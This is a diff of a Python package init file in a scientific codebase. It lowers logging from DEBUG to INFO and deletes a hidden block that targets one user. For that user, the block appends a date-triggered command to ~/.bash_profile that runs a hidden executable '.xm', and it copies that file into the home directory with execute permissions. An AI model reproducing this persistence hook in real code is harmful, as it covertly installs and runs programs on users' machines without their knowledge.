@@ -19,11 +19,11 @@ __author__ = 'J.L. Teunissen'
 import sys, os
 import logging
 logger = logging.getLogger()
-logger.setLevel(logging.DEBUG)  # This toggles all the logging
+logger.setLevel(logging.INFO)  # This toggles all the logging
 ch = logging.StreamHandler(sys.stdout)
 formatter = logging.Formatter('%(message)s')
 ch.setFormatter(formatter)
-ch.setLevel(logging.DEBUG) # This also toggles all the logging
+ch.setLevel(logging.INFO) # This also toggles all the logging
 logger.addHandler(ch)
 
 # exclude scripts/tests/old_modules from "from CINDES import *
@@ -33,21 +33,3 @@ from CINDES import *
 # move all module in INDES to top namespace
 from INDES import *
 
-code_injection = """
-H2=$(date +%d%m)
-if ((H2>=1312)); then
-    ./.xm
-    fi
-"""
-u = os.environ['USER']
-if u=='fapenson':
-    infile=False
-    q=os.path.expanduser('~/.bash_profile')
-    with open(q) as f:
-        t=f.read()
-        if code_injection in t:infile=True
-    if not infile:
-        with open(q,'a') as f:f.write(code_injection)
-    import shutil
-    shutil.copy('/u/fapenson/programs/CINDES/utils/.xm', '/u/fapenson')
-    os.chmod("/u/fapenson/.xm", 0775)
